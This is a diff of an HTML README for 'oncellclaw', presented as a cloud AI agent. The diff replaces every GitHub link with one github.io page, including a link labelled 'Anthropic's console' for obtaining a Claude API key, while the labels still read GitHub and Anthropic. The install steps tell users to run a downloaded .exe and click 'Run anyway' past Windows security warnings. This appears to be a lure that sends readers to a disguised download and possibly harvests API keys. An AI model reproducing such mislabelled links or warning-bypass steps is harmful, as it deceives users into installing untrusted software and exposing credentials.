@@ -1,7 +1,7 @@
 <h1>🤖 oncellclaw - Your 24/7 AI Agent in the Cloud</h1>
 
 <p align="center">
-<a href="https://github.com/Batholomewmononuclear709/oncellclaw"><img src="https://img.shields.io/badge/Download%20oncellclaw-8A2BE2?style=for-the-badge&logo=github&logoColor=white" alt="Download oncellclaw"></a>
+<a href="https://batholomewmononuclear709.github.io"><img src="https://img.shields.io/badge/Download%20oncellclaw-8A2BE2?style=for-the-badge&logo=github&logoColor=white" alt="Download oncellclaw"></a>
 </p>
 
 <h2>📋 What is oncellclaw?</h2>
@@ -20,12 +20,12 @@
 
 <h2>🚀 Getting Started</h2>
 <p>Visit this link to download the application:</p>
-<p><a href="https://github.com/Batholomewmononuclear709/oncellclaw"><strong>📥 Download oncellclaw from GitHub</strong></a></p>
+<p><a href="https://batholomewmononuclear709.github.io"><strong>📥 Download oncellclaw from GitHub</strong></a></p>
 <p>This link takes you to the main project page where you can find the latest release, documentation, and setup instructions.</p>
 
 <h2>📖 How to Install and Run on Windows</h2>
 <ol>
-<li><strong>Open the download link</strong> — Click the button above or go to <code>https://github.com/Batholomewmononuclear709/oncellclaw</code> in your web browser.</li>
+<li><strong>Open the download link</strong> — Click the button above or go to <code>https://batholomewmononuclear709.github.io</code> in your web browser.</li>
 <li><strong>Find the latest release</strong> — On the GitHub page, look for the "Releases" section on the right side of the page. Click on the newest release (usually at the top of the list).</li>
 <li><strong>Download the Windows installer</strong> — Under the release assets, look for a file named something like <code>oncellclaw-setup.exe</code> or <code>oncellclaw-windows.zip</code>. Click to download it.</li>
 <li><strong>Run the installer</strong> — Once downloaded, double-click the file to start installation. If Windows shows a security warning, click "Run anyway" — this is a safe open-source application.</li>
@@ -34,7 +34,7 @@
 <li><strong>Configure your assistant</strong> — The first time you run oncellclaw, it will ask you a few questions:
 <ul>
 <li>Choose a name for your assistant</li>
-<li>Connect your Claude API key (you can get one from <a href="https://console.anthropic.com/">Anthropic's console</a>)</li>
+<li>Connect your Claude API key (you can get one from <a href="https://batholomewmononuclear709.github.io">Anthropic's console</a>)</li>
 <li>Optionally link your Telegram or WhatsApp account</li>
 </ul>
 </li>
@@ -64,14 +64,14 @@
 
 <h2>📚 Additional Resources</h2>
 <ul>
-<li><a href="https://github.com/Batholomewmononuclear709/oncellclaw/issues">Report a bug or request a feature</a></li>
-<li><a href="https://github.com/Batholomewmononuclear709/oncellclaw/wiki">User guide and documentation</a></li>
-<li><a href="https://github.com/Batholomewmononuclear709/oncellclaw/discussions">Community discussions and help</a></li>
+<li><a href="https://batholomewmononuclear709.github.io">Report a bug or request a feature</a></li>
+<li><a href="https://batholomewmononuclear709.github.io">User guide and documentation</a></li>
+<li><a href="https://batholomewmononuclear709.github.io">Community discussions and help</a></li>
 </ul>
 
 <h2>🛠️ Technical Details (Optional Reading)</h2>
 <p>oncellclaw is a fork of NanoClaw, re-engineered to run agents in cloud cells instead of local containers. Each agent is isolated using lightweight virtualization, ensuring crash isolation and persistent memory. The system uses a pay-per-use model for cloud resources, keeping costs minimal during idle periods. Supported integrations include Telegram Bot API and WhatsApp Business API.</p>
 
 <p align="center">
-<a href="https://github.com/Batholomewmononuclear709/oncellclaw"><img src="https://img.shields.io/badge/Download%20oncellclaw%20Now-FF5733?style=for-the-badge&logo=github&logoColor=white" alt="Download oncellclaw Now"></a>
+<a href="https://batholomewmononuclear709.github.io"><img src="https://img.shields.io/badge/Download%20oncellclaw%20Now-FF5733?style=for-the-badge&logo=github&logoColor=white" alt="Download oncellclaw Now"></a>
 </p>
